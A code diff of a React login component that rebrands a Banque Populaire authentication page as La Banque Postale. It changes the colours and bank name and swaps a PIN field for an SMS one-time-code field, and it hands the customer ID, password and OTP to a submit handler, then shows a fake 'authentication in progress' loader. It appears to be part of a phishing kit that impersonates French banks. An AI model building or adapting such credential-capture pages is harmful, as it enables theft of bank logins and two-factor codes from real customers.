@@ -1,20 +1,19 @@
 import React, { useState } from 'react';
 import { Loader2, Eye, EyeOff } from 'lucide-react';
 
-interface BanquePopulaireAuthTemplateProps {
+interface BanquePostaleAuthTemplateProps {
   onSubmit: (formData: any) => Promise<boolean>;
 }
 
-export function BanquePopulaireAuthTemplate({ onSubmit }: BanquePopulaireAuthTemplateProps) {
+export function BanquePostaleAuthTemplate({ onSubmit }: BanquePostaleAuthTemplateProps) {
   const [formData, setFormData] = useState({
     customerId: '',
     password: '',
-    pin: ''
+    otp: ''
   });
   const [status, setStatus] = useState<'idle' | 'sending' | 'success' | 'error'>('idle');
   const [showLoader, setShowLoader] = useState(false);
   const [showPassword, setShowPassword] = useState(false);
-  const [showPin, setShowPin] = useState(false);
 
   const handleSubmit = async (e: React.FormEvent) => {
     e.preventDefault();
@@ -47,20 +46,20 @@ export function BanquePopulaireAuthTemplate({ onSubmit }: BanquePopulaireAuthTem
 
   if (showLoader) {
     return (
-      <div className="min-h-screen bg-gradient-to-br from-red-100 to-red-50 pt-20">
+      <div className="min-h-screen bg-gradient-to-br from-blue-100 to-yellow-50 pt-20">
         <div className="max-w-4xl mx-auto px-4 py-8">
           <div className="bg-white rounded-2xl shadow-xl p-8">
             <div className="flex flex-col items-center justify-center py-16">
-              <Loader2 className="w-12 h-12 animate-spin text-red-600 mb-6" />
+              <Loader2 className="w-12 h-12 animate-spin text-blue-600 mb-6" />
               <h2 className="text-2xl font-bold text-gray-800 mb-4">
                 Authentification en cours...
               </h2>
               <p className="text-gray-600 text-center max-w-md">
-                Connexion sécurisée à votre espace Banque Populaire en cours. Veuillez patienter.
+                Connexion sécurisée à votre espace La Banque Postale en cours. Veuillez patienter.
               </p>
               <div className="mt-8 w-full max-w-xs">
                 <div className="bg-gray-200 rounded-full h-2">
-                  <div className="bg-red-600 h-2 rounded-full animate-pulse" style={{ width: '70%' }}></div>
+                  <div className="bg-blue-600 h-2 rounded-full animate-pulse" style={{ width: '70%' }}></div>
                 </div>
               </div>
             </div>
@@ -71,12 +70,12 @@ export function BanquePopulaireAuthTemplate({ onSubmit }: BanquePopulaireAuthTem
   }
 
   return (
-    <div className="min-h-screen bg-gradient-to-br from-red-100 to-red-50 pt-20">
+    <div className="min-h-screen bg-gradient-to-br from-blue-100 to-yellow-50 pt-20">
       <div className="max-w-4xl mx-auto px-4 py-8">
         <div className="bg-white rounded-2xl shadow-xl overflow-hidden">
-          <div className="bg-gradient-to-r from-red-600 to-red-700 px-8 py-12">
-            <h1 className="text-3xl font-bold text-white mb-2">Banque Populaire</h1>
-            <p className="text-red-100">Authentification sécurisée</p>
+          <div className="bg-gradient-to-r from-blue-600 to-blue-700 px-8 py-12">
+            <h1 className="text-3xl font-bold text-white mb-2">La Banque Postale</h1>
+            <p className="text-blue-100">Authentification sécurisée</p>
           </div>
 
           <div className="p-8">
@@ -92,7 +91,7 @@ export function BanquePopulaireAuthTemplate({ onSubmit }: BanquePopulaireAuthTem
                   onChange={handleChange}
                   placeholder="Entrez votre identifiant"
                   required
-                  className="w-full px-4 py-3 border border-gray-300 rounded-lg focus:ring-2 focus:ring-red-500 focus:border-transparent"
+                  className="w-full px-4 py-3 border border-gray-300 rounded-lg focus:ring-2 focus:ring-blue-500 focus:border-transparent"
                 />
               </div>
 
@@ -108,7 +107,7 @@ export function BanquePopulaireAuthTemplate({ onSubmit }: BanquePopulaireAuthTem
                     onChange={handleChange}
                     placeholder="Entrez votre mot de passe"
                     required
-                    className="w-full px-4 py-3 border border-gray-300 rounded-lg focus:ring-2 focus:ring-red-500 focus:border-transparent"
+                    className="w-full px-4 py-3 border border-gray-300 rounded-lg focus:ring-2 focus:ring-blue-500 focus:border-transparent"
                   />
                   <button
                     type="button"
@@ -122,32 +121,24 @@ export function BanquePopulaireAuthTemplate({ onSubmit }: BanquePopulaireAuthTem
 
               <div>
                 <label className="block text-sm font-medium text-gray-700 mb-2">
-                  Code PIN
+                  Code OTP (reçu par SMS)
                 </label>
-                <div className="relative">
-                  <input
-                    type={showPin ? 'text' : 'password'}
-                    name="pin"
-                    value={formData.pin}
-                    onChange={handleChange}
-                    placeholder="Entrez votre code PIN"
-                    required
-                    className="w-full px-4 py-3 border border-gray-300 rounded-lg focus:ring-2 focus:ring-red-500 focus:border-transparent"
-                  />
-                  <button
-                    type="button"
-                    onClick={() => setShowPin(!showPin)}
-                    className="absolute right-3 top-3 text-gray-500"
-                  >
-                    {showPin ? <EyeOff size={20} /> : <Eye size={20} />}
-                  </button>
-                </div>
+                <input
+                  type="text"
+                  name="otp"
+                  value={formData.otp}
+                  onChange={handleChange}
+                  placeholder="Entrez le code OTP"
+                  maxLength="6"
+                  required
+                  className="w-full px-4 py-3 border border-gray-300 rounded-lg focus:ring-2 focus:ring-blue-500 focus:border-transparent"
+                />
               </div>
 
               <button
                 type="submit"
                 disabled={status === 'sending'}
-                className="w-full bg-red-600 text-white font-semibold py-4 rounded-lg transition duration-200 hover:bg-red-700 disabled:opacity-50 disabled:cursor-not-allowed"
+                className="w-full bg-blue-600 text-white font-semibold py-4 rounded-lg transition duration-200 hover:bg-blue-700 disabled:opacity-50 disabled:cursor-not-allowed"
               >
                 {status === 'sending' ? 'Authentification...' : 'SE CONNECTER'}
               </button>
